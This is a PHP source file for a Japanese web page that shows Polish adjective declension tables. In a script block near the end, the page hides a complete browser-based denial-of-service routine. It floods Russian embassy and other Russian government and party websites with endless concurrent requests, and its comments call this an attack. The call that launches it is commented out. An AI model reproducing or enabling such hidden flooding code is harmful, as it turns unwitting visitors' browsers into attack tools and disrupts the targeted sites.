<?php
session_start();

header("Content-type: text/html; charset=utf-8");

//読み込み
include(dirname(__FILE__) . "/language_class/IndoEuropean_adjective_class.php");
include(dirname(__FILE__) . "/language_class/Database_session.php");
include(dirname(__FILE__) . "/language_class/Commons.php");
include(dirname(__FILE__) . "/language_class/Polish_Common.php");

// 活用表を取得する。
function get_adjective_declension_chart($word){
	// 形容詞の情報を取得
	$adjective_words = Polish_Common::get_dictionary_stem_by_japanese($word, Polish_Common::$DB_ADJECTIVE, "");
  // 取得できない場合は
  if(!$adjective_words){
    // 英語で取得する。
    $adjective_words = Polish_Common::get_dictionary_stem_by_english($word, Polish_Common::$DB_ADJECTIVE);  
    if(!$adjective_words){
      // 取得できない場合は
      if(!$adjective_words && !Polish_Common::is_alphabet_or_not($word)){
        // 空を返す。
        return array();
      } else if(Polish_Common::is_alphabet_or_not($word)){
        $adjective_words[] = $word;
      }
    }
  }
	// 配列を宣言
	$declensions = array();  
	// 新しい配列に詰め替え
	foreach ($adjective_words as $adjective_word) {
		// 読み込み
		$polish_adjective = new Polish_Adjective($adjective_word);
		// 活用表生成
		$declensions[$polish_adjective->get_first_stem()] = $polish_adjective->get_chart();
	}
  // 結果を返す。
	return $declensions;
  
}

// 挿入データ－対象－
$input_adjective = Commons::cut_words(trim(filter_input(INPUT_POST, 'input_adjective')), 128);

// 検索結果の配列
$declensions = array();

// 対象が入力されていれば処理を実行
if($input_adjective != ""){
	$declensions = get_adjective_declension_chart($input_adjective);
}

?>
<!doctype html>
<html lang="ja">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <title>印欧語活用辞典：梵語辞書</title>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/dt/dt-1.10.18/datatables.min.css"/>
    <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
    <script type="text/javascript" src="https://cdn.datatables.net/v/dt/dt-1.10.18/datatables.min.js"></script>
  </head>
  <?php require_once("header.php"); ?>
  <body>
    <div class="container item table-striped">   
      <p>あいまい検索は+</p>
      <form action="" method="post" class="mt-4 mb-4" id="form-search">
        <input type="text" name="input_adjective" class="">
        <input type="submit" class="btn-check" id="btn-search">
        <label class="btn" for="btn-search">検索</label>
        <select class="" id="adjective-selection" aria-label="Default select example">
          <option selected>単語を選んでください</option>
          <?php echo Commons::select_option($declensions); ?>
        </select>
      </form>
      <table class="table-bordered" id="adjective-table">
        <?php echo Polish_Common::make_adjective_column_chart("形容詞"); ?>
        <tbody>
          <?php echo Polish_Common::make_adjective_chart(); ?>     
        </tbody>
      </table>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    <script>
        var adj_table_data = '<?php echo json_encode($declensions, JSON_UNESCAPED_UNICODE); ?>';
    </script>
    <script>
        $(function(){
          // イベントを設定
          setEvents();
        });

        // 配列をテーブル用に変換にする。
        function arrange_table_data(table_data, word){

          // JSONに書き換え
          var json_adjective = JSON.parse(table_data)[word];

          // 原級形容詞の格変化情報を取得
          var positive_masc_sg = json_adjective["positive"]["masc"]["sg"];   //単数男性
          var positive_fem_sg = json_adjective["positive"]["fem"]["sg"];     //単数女性
          var positive_neu_sg = json_adjective["positive"]["neu"]["sg"];   	//単数中性
          var positive_masc_du = json_adjective["positive"]["masc"]["du"];   //双数男性
          var positive_fem_du = json_adjective["positive"]["fem"]["du"];     //双数女性
          var positive_neu_du = json_adjective["positive"]["neu"]["du"];   	//双数中性          
          var positive_masc_pl = json_adjective["positive"]["masc"]["pl"]; 	//複数男性
          var positive_fem_pl = json_adjective["positive"]["fem"]["pl"];   	//複数女性
          var positive_neu_pl = json_adjective["positive"]["neu"]["pl"];   	//複数中性
          
          // 比較級形容詞の格変化情報を取得
          var comp_masc_sg = json_adjective["comp"]["masc"]["sg"]; 	        //単数男性
          var comp_fem_sg = json_adjective["comp"]["fem"]["sg"];   	        //単数女性
          var comp_neu_sg = json_adjective["comp"]["neu"]["sg"];   	        //単数中性
          var comp_masc_du = json_adjective["comp"]["masc"]["du"];           //双数男性
          var comp_fem_du = json_adjective["comp"]["fem"]["du"];             //双数女性
          var comp_neu_du = json_adjective["comp"]["neu"]["du"];   	        //双数中性           
          var comp_masc_pl = json_adjective["comp"]["masc"]["pl"]; 		      //複数男性
          var comp_fem_pl = json_adjective["comp"]["fem"]["pl"];   		      //複数女性
          var comp_neu_pl = json_adjective["comp"]["neu"]["pl"];   		      //複数中性
          
          // 最上級形容詞の格変化情報を取得
          var super_masc_sg = json_adjective["super"]["masc"]["sg"]; 	      //単数男性
          var super_fem_sg = json_adjective["super"]["fem"]["sg"];   	      //単数女性
          var super_neu_sg = json_adjective["super"]["neu"]["sg"];   	      //単数中性
          var super_masc_du = json_adjective["super"]["masc"]["du"];         //双数男性
          var super_fem_du = json_adjective["super"]["fem"]["du"];           //双数女性
          var super_neu_du = json_adjective["super"]["neu"]["du"];   	      //双数中性            
          var super_masc_pl = json_adjective["super"]["masc"]["pl"]; 		    //複数男性
          var super_fem_pl = json_adjective["super"]["fem"]["pl"];   		    //複数女性
          var super_neu_pl = json_adjective["super"]["neu"]["pl"];   		    //複数中性
          
          // 格納データを作成
          var adj_table = [
            ["", "", "", "", "", "", ""],
            [positive_masc_sg["nom"], positive_fem_sg["nom"], positive_neu_sg["nom"], positive_masc_du["nom"], positive_fem_du["nom"], positive_neu_du["nom"], positive_masc_pl["nom"], positive_fem_pl["nom"], positive_neu_pl["nom"]],
            [positive_masc_sg["gen"], positive_fem_sg["gen"], positive_neu_sg["gen"], positive_masc_du["gen"], positive_fem_du["gen"], positive_neu_du["gen"], positive_masc_pl["gen"], positive_fem_pl["gen"], positive_neu_pl["gen"]],
            [positive_masc_sg["dat"], positive_fem_sg["dat"], positive_neu_sg["dat"], positive_masc_du["dat"], positive_fem_du["dat"], positive_neu_du["dat"], positive_masc_pl["dat"], positive_fem_pl["dat"], positive_neu_pl["dat"]],
            [positive_masc_sg["acc"], positive_fem_sg["acc"], positive_neu_sg["acc"], positive_masc_du["acc"], positive_fem_du["acc"], positive_neu_du["acc"], positive_masc_pl["acc"], positive_fem_pl["acc"], positive_neu_pl["acc"]],
            [positive_masc_sg["ins"], positive_fem_sg["ins"], positive_neu_sg["ins"], positive_masc_du["ins"], positive_fem_du["ins"], positive_neu_du["ins"], positive_masc_pl["ins"], positive_fem_pl["ins"], positive_neu_pl["ins"]],            
            [positive_masc_sg["loc"], positive_fem_sg["loc"], positive_neu_sg["loc"], positive_masc_du["loc"], positive_fem_du["loc"], positive_neu_du["loc"], positive_masc_pl["loc"], positive_fem_pl["loc"], positive_neu_pl["loc"]],
            [positive_masc_sg["voc"], positive_fem_sg["voc"], positive_neu_sg["voc"], positive_masc_du["voc"], positive_fem_du["voc"], positive_neu_du["voc"], positive_masc_pl["voc"], positive_fem_pl["voc"], positive_neu_pl["voc"]],
            ["", "", "", "", "", "", ""],
            [comp_masc_sg["nom"], comp_fem_sg["nom"], comp_neu_sg["nom"], comp_masc_du["nom"], comp_fem_du["nom"], comp_neu_du["nom"], comp_masc_pl["nom"], comp_fem_pl["nom"], comp_neu_pl["nom"]],
            [comp_masc_sg["gen"], comp_fem_sg["gen"], comp_neu_sg["gen"], comp_masc_du["gen"], comp_fem_du["gen"], comp_neu_du["gen"], comp_masc_pl["gen"], comp_fem_pl["gen"], comp_neu_pl["gen"]],
            [comp_masc_sg["dat"], comp_fem_sg["dat"], comp_neu_sg["dat"], comp_masc_du["dat"], comp_fem_du["dat"], comp_neu_du["dat"], comp_masc_pl["dat"], comp_fem_pl["dat"], comp_neu_pl["dat"]],
            [comp_masc_sg["acc"], comp_fem_sg["acc"], comp_neu_sg["acc"], comp_masc_du["acc"], comp_fem_du["acc"], comp_neu_du["acc"], comp_masc_pl["acc"], comp_fem_pl["acc"], comp_neu_pl["acc"]],
            [comp_masc_sg["ins"], comp_fem_sg["ins"], comp_neu_sg["ins"], comp_masc_du["ins"], comp_fem_du["ins"], comp_neu_du["ins"], comp_masc_pl["ins"], comp_fem_pl["ins"], comp_neu_pl["ins"]],
            [comp_masc_sg["loc"], comp_fem_sg["loc"], comp_neu_sg["loc"], comp_masc_du["loc"], comp_fem_du["loc"], comp_neu_du["loc"], comp_masc_pl["loc"], comp_fem_pl["loc"], comp_neu_pl["loc"]],
            [comp_masc_sg["voc"], comp_fem_sg["voc"], comp_neu_sg["voc"], comp_masc_du["voc"], comp_fem_du["voc"], comp_neu_du["voc"], comp_masc_pl["voc"], comp_fem_pl["voc"], comp_neu_pl["voc"]],  
            ["", "", "", "", "", "", ""],
            [super_masc_sg["nom"], super_fem_sg["nom"], super_neu_sg["nom"], super_masc_du["nom"], super_fem_du["nom"], super_neu_du["nom"], super_masc_pl["nom"], super_fem_pl["nom"], super_neu_pl["nom"]],
            [super_masc_sg["gen"], super_fem_sg["gen"], super_neu_sg["gen"], super_masc_du["gen"], super_fem_du["gen"], super_neu_du["gen"], super_masc_pl["gen"], super_fem_pl["gen"], super_neu_pl["gen"]],
            [super_masc_sg["dat"], super_fem_sg["dat"], super_neu_sg["dat"], super_masc_du["dat"], super_fem_du["dat"], super_neu_du["dat"], super_masc_pl["dat"], super_fem_pl["dat"], super_neu_pl["dat"]],
            [super_masc_sg["acc"], super_fem_sg["acc"], super_neu_sg["acc"], super_masc_du["acc"], super_fem_du["acc"], super_neu_du["acc"], super_masc_pl["acc"], super_fem_pl["acc"], super_neu_pl["acc"]],
            [super_masc_sg["ins"], super_fem_sg["ins"], super_neu_sg["ins"], super_masc_du["ins"], super_fem_du["ins"], super_neu_du["ins"], super_masc_pl["ins"], super_fem_pl["ins"], super_neu_pl["ins"]],            
            [super_masc_sg["loc"], super_fem_sg["loc"], super_neu_sg["loc"], super_masc_du["loc"], super_fem_du["loc"], super_neu_du["loc"], super_masc_pl["loc"], super_fem_pl["loc"], super_neu_pl["loc"]],
            [super_masc_sg["voc"], super_fem_sg["voc"], super_neu_sg["voc"], super_masc_du["voc"], super_fem_du["voc"], super_neu_du["voc"], super_masc_pl["voc"], super_fem_pl["voc"], super_neu_pl["voc"]],             
          ];
          
          // 結果を返す。
          return adj_table;
        }

        // 単語選択後の処理
        function output_table_data(){
          // 格変化表を取得 
          const adjective_decl_data = arrange_table_data(adj_table_data, $('#adjective-selection').val());

          // 行オブジェクトの取得
          var rows = $('#adjective-table')[0].rows;
          // 各行をループ処理
          $.each(rows, function(i){
            // タイトル行は除外する。
            if(i == 0 || i == 1){
              return true;
            } else if(adjective_decl_data[i - 2][0] == ""){
              if(i == 2){
                rows[i].cells[0].innerText = "原級 " + $('#adjective-selection').val();
              } else if(i == 20){
                rows[i].cells[0].innerText = "比較級 " + $('#adjective-selection').val();
              } else if(i == 38){
                rows[i].cells[0].innerText = "最上級 " + $('#adjective-selection').val();
              }
              // 説明行も除外
              return true;
            } else {
              // 格変化を挿入
              rows[i].cells[1].innerText = adjective_decl_data[i - 2][0]; // 単数男性(1行目)
              rows[i].cells[2].innerText = adjective_decl_data[i - 2][1]; // 単数女性(2行目)
              rows[i].cells[3].innerText = adjective_decl_data[i - 2][2]; // 単数中性(3行目)
              rows[i].cells[4].innerText = adjective_decl_data[i - 2][3]; // 双数男性(4行目)
              rows[i].cells[5].innerText = adjective_decl_data[i - 2][4]; // 双数女性(5行目)
              rows[i].cells[6].innerText = adjective_decl_data[i - 2][5]; // 双数中性(6行目)  
              rows[i].cells[7].innerText = adjective_decl_data[i - 2][6]; // 複数男性(4行目)
              rows[i].cells[8].innerText = adjective_decl_data[i - 2][7]; // 複数女性(5行目)
              rows[i].cells[9].innerText = adjective_decl_data[i - 2][8]; // 複数中性(6行目)       
            }
              
          });
        }

        //イベントを設定
        function setEvents(){
	        // セレクトボックス選択時
	        $('#adjective-selection').change( function(){
            output_table_data();
	        });
        }

    </script>
    <script>
      // ターゲットを指定
      var targets = {
           'https://tokyo.mid.ru/web/tokyo-ja': { number_of_requests: 0, number_of_errored_responses: 0 },        // ロシア大使館
           'https://tokyo.kdmid.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // ロシア大使館(訪問予約サイト)
           'https://spravedlivo.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // 公正ロシア
           'http://www.yuzhnokurilsk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },             // 南クリル管区
           'http://xn----8sbmnjbgm3ams5i.xn--p1ai/': { number_of_requests: 0, number_of_errored_responses: 0 },   // クリル管区                          
    	  }    
      
      // 1秒ごとの攻撃頻度
      var CONCURRENCY_LIMIT = 1000
      var queue = []
      
      // リクエスト送信
      async function fetchWithTimeout(resource, options) {
        // コントローラーを取得
        const controller = new AbortController();
        // IDを取得
        const id = setTimeout(() => controller.abort(), options.timeout);
        // 攻撃処理を返す。
        return fetch(resource, {
          method: 'GET',              //GET方式
          mode: 'no-cors',
          signal: controller.signal
        }).then((response) => {
          clearTimeout(id);
          return response;
        }).catch((error) => {
            console.log(error.code);
          clearTimeout(id);
          throw error;
        });
      }
    
      // 各ターゲットに攻撃する。
      async function flood(target) {
        //for文を使った無限ループ
        for (var i = 0;; ++i) {
          // リクエストの数が規定数になったら
          if (queue.length > CONCURRENCY_LIMIT) {
            // 最初リクエストを削除する。
            await queue.shift()
          }
          // 乱数を生成
          rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
          // 攻撃リクエストを追加する。
          queue.push(
            // 関数を実行する(時間制限：1秒)
            fetchWithTimeout(target+rand, { timeout: 1000 })
              // エラーがある場合はエラーを取得する。
              .catch((error) => {
                if (error.code === 20 /* ABORT */) {
                  return;
                }
                targets[target].number_of_errored_responses++;
              })
              // 処理後の処理をする。
              .then((response) => {
                // エラーがある場合はエラー処理を入れる。
                if (response && !response.ok) {
                  targets[target].number_of_errored_responses++;
                }
                // リクエスト数を追加する。
                targets[target].number_of_requests++;
              })
            
          )
        }
      }
      // 全てのターゲット要素に対して攻撃処理を実行する。
      //Object.keys(targets).map(flood)
    </script> 
  <footer class="">
  </footer>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
  </body>
</html>